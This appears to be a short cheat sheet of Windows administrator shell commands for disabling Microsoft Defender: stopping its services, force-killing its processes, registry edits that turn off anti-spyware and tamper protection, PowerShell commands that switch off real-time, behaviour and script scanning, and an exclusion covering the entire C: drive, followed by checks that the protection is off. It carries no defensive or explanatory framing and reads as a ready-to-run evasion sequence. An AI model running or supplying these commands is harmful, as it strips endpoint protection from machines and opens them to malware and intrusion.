CMD commands - admin shell -
### initial checks 
whoami
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
powershell -ExecutionPolicy Bypass -Command "Get-MpPreference | Select DisableRealtimeMonitoring"

### Service Control & Process Termination
net stop WinDefend /y
sc stop WinDefend

taskkill /f /im MsMpEng.exe
taskkill /f /im SecurityHealthService.exe

###  Registry Modifications (Disable Defender)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f

reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\" /t REG_DWORD /d 0 /f

###  PowerShell Defender Commands
powershell -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

powershell -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableBehaviorMonitoring $true -DisableScriptScanning $true"

powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'"

powershell -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue"

### Verification Commands

powershell -ExecutionPolicy Bypass -Command "Get-MpPreference | Select DisableRealtimeMonitoring"

powershell -ExecutionPolicy Bypass -Command "Get-MpComputerStatus"


